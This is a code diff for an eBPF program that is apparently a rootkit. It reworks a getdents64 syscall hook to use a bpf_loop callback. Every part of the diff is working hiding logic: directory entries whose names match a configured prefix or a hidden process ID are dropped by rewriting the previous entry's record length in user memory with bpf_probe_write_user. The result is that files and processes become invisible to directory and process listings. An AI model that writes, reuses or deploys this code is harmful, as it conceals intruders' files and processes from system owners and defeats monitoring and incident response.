@@ -124,60 +124,77 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
 	return 0;
 }
 
+struct getdents_ctx {
+    __u64 dirp;
+    long total;
+    long bpos;
+    __u64 prev;
+    struct rk_config *cfg;
+};
+
+static long process_one_dirent(__u32 index, void *ctx)
+{
+    struct getdents_ctx *c = ctx;
+    __u64 cur;
+    unsigned short reclen = 0;
+    char name[MAX_NAME_LEN] = {};
+
+    if (c->bpos >= c->total)
+        return 1; // stop loop
+
+    cur = c->dirp + c->bpos;
+
+    if (bpf_probe_read_user(&reclen, sizeof(reclen),
+                (void *)(cur + DIRENT_RECLEN_OFF)))
+        return 1;
+    if (reclen == 0)
+        return 1;
+
+    bpf_probe_read_user_str(name, sizeof(name),
+                (void *)(cur + DIRENT_NAME_OFF));
+
+    if (has_prefix(name, c->cfg) || is_hidden_pid(name, c->cfg->hide_pid)) {
+        if (c->prev) {
+            unsigned short plen = 0;
+            bpf_probe_read_user(&plen, sizeof(plen),
+                        (void *)(c->prev + DIRENT_RECLEN_OFF));
+            plen += reclen;
+            bpf_probe_write_user((void *)(c->prev + DIRENT_RECLEN_OFF),
+                         &plen, sizeof(plen));
+        }
+        // keep prev unchanged so consecutive targets merge
+    } else {
+        c->prev = cur;
+    }
+    c->bpos += reclen;
+    return 0; // continue
+}
+
 SEC("tp/syscalls/sys_exit_getdents64")
 int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 {
-	struct rk_config *cfg = get_cfg();
-	__u64 id = bpf_get_current_pid_tgid();
-	long total = ctx->ret;                /* bytes the kernel wrote */
-	__u64 *pdirp, dirp;
-	long bpos = 0;
-	__u64 prev = 0;                       /* previous record address, 0 = none */
+    struct rk_config *cfg = get_cfg();
+    __u64 id = bpf_get_current_pid_tgid();
+    long total = ctx->ret;
+    __u64 *pdirp;
+    struct getdents_ctx c = {};
 
-	if (!cfg || !cfg->enabled)
-		goto done;
-	pdirp = bpf_map_lookup_elem(&buffers, &id);
-	if (!pdirp)
-		return 0;
-	dirp = *pdirp;
-	if (total <= 0)
-		goto done;
+    if (!cfg || !cfg->enabled)
+        goto done;
+    pdirp = bpf_map_lookup_elem(&buffers, &id);
+    if (!pdirp)
+        return 0;
+    c.dirp = *pdirp;
+    c.total = total;
+    c.prev = 0;
+    c.cfg = cfg;
 
-	/* bounded (not unrolled) walk; the verifier accepts bounded loops and
-	 * unrolling 512 iterations would explode the instruction count. */
-	for (int i = 0; i < MAX_DENTS; i++) {
-		if (bpos >= total)
-			break;
+    if (total <= 0)
+        goto done;
 
-		__u64 cur = dirp + bpos;
-		unsigned short reclen = 0;
-		char name[MAX_NAME_LEN] = {};
-
-		if (bpf_probe_read_user(&reclen, sizeof(reclen),
-					(void *)(cur + DIRENT_RECLEN_OFF)))
-			break;
-		if (reclen == 0)
-			break;
-		bpf_probe_read_user_str(name, sizeof(name),
-					(void *)(cur + DIRENT_NAME_OFF));
-
-		if (has_prefix(name, cfg) || is_hidden_pid(name, cfg->hide_pid)) {
-			if (prev) {
-				unsigned short plen = 0;
-				bpf_probe_read_user(&plen, sizeof(plen),
-						    (void *)(prev + DIRENT_RECLEN_OFF));
-				plen += reclen;
-				bpf_probe_write_user((void *)(prev + DIRENT_RECLEN_OFF),
-						     &plen, sizeof(plen));
-			}
-			/* keep `prev` unchanged so consecutive targets all merge */
-		} else {
-			prev = cur;
-		}
-		bpos += reclen;
-	}
+    bpf_loop(MAX_DENTS, process_one_dirent, &c, 0);
 
 done:
-	bpf_map_delete_elem(&buffers, &id);
-	return 0;
+    bpf_map_delete_elem(&buffers, &id);
+    return 0;
 }
